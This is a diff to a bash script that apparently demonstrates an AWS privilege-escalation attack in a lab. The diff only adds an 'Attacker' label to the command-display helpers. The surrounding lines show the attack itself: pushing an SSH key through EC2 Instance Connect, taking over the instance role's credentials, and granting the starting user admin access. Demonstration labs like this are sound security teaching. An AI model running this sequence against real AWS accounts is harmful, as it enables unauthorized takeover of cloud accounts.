@@ -24,12 +24,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -105,7 +107,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -117,7 +119,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -125,7 +127,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -136,7 +138,7 @@ echo ""
 # Step 5: Discover target EC2 instance
 echo -e "${YELLOW}Step 5: Discovering target EC2 instance${NC}"
 echo "Getting instance details..."
-show_cmd aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn,Platform]' --output text
+show_cmd "Attacker" "aws ec2 describe-instances --region "$AWS_REGION" --instance-ids "$INSTANCE_ID" --query 'Reservations[0].Instances[0].[InstanceId,State.Name,PublicIpAddress,IamInstanceProfile.Arn,Platform]' --output text"
 INSTANCE_INFO=$(aws ec2 describe-instances \
     --region $AWS_REGION \
     --instance-ids $INSTANCE_ID \
@@ -202,7 +204,7 @@ echo "We can push our SSH public key to the instance for 60 seconds!"
 EC2_USER="ec2-user"
 
 # Attempt to send SSH public key
-show_attack_cmd aws ec2-instance-connect send-ssh-public-key --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --instance-os-user "$EC2_USER" --ssh-public-key "file://${SSH_KEY_PATH}.pub"
+show_attack_cmd "Attacker" "aws ec2-instance-connect send-ssh-public-key --region "$AWS_REGION" --instance-id "$INSTANCE_ID" --instance-os-user "$EC2_USER" --ssh-public-key "file://${SSH_KEY_PATH}.pub""
 aws ec2-instance-connect send-ssh-public-key \
     --region $AWS_REGION \
     --instance-id $INSTANCE_ID \
@@ -272,7 +274,7 @@ export AWS_SESSION_TOKEN="$EXTRACTED_SESSION_TOKEN"
 export AWS_REGION="$AWS_REGION"
 
 # Verify new identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 NEW_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $NEW_IDENTITY"
 echo -e "${GREEN}✓ Now using extracted EC2 admin role credentials${NC}\n"
@@ -308,14 +310,14 @@ unset AWS_SESSION_TOKEN
 export AWS_REGION="$AWS_REGION"
 
 # Verify we're back to starting user
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 STARTING_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Back to starting user: $STARTING_IDENTITY"
 echo ""
 
 echo "Testing admin access as starting user..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "Attacker" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ STARTING USER NOW HAS ADMIN ACCESS!${NC}"
